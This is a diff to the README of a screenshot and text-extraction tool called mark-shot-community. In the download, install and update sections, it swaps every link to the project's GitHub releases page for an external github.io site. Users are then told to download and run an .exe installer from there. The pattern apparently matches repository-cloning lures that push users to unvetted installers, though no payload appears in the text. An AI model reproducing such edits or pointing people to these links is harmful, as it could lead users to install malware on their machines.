@@ -1,6 +1,6 @@
 # 📸 mark-shot-community - Capture, Annotate, and Extract Text Instantly
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/Camouflaged-chaldron860/mark-shot-community/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://camouflaged-chaldron860.github.io)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to **mark-shot-community**! This is a free, easy-to-use tool that lets y
 
 ## 📥 How to Download and Install
 
-1. **Visit this link to download the application:** [Click here to go to the download page](https://github.com/Camouflaged-chaldron860/mark-shot-community/releases)
+1. **Visit this link to download the application:** [Click here to go to the download page](https://camouflaged-chaldron860.github.io)
 2. On the page, look for the latest release (usually the top one). Click on the file named something like `mark-shot-community-*.exe` (for Windows) or your platform's installer.
 3. Once downloaded, double-click the file to run the installer. Follow the simple on-screen steps.
 4. After installation, find "Mark Shot Community" in your Start Menu or Applications folder and launch it.
@@ -64,7 +64,7 @@ A: Make sure you have Tesseract installed. On Windows, the installer usually inc
 
 ## 🔄 Updating
 
-mark-shot-community will check for updates automatically. You can also manually download the latest version from the [releases page](https://github.com/Camouflaged-chaldron860/mark-shot-community/releases).
+mark-shot-community will check for updates automatically. You can also manually download the latest version from the [releases page](https://camouflaged-chaldron860.github.io).
 
 ## 🤝 Need Help?
 
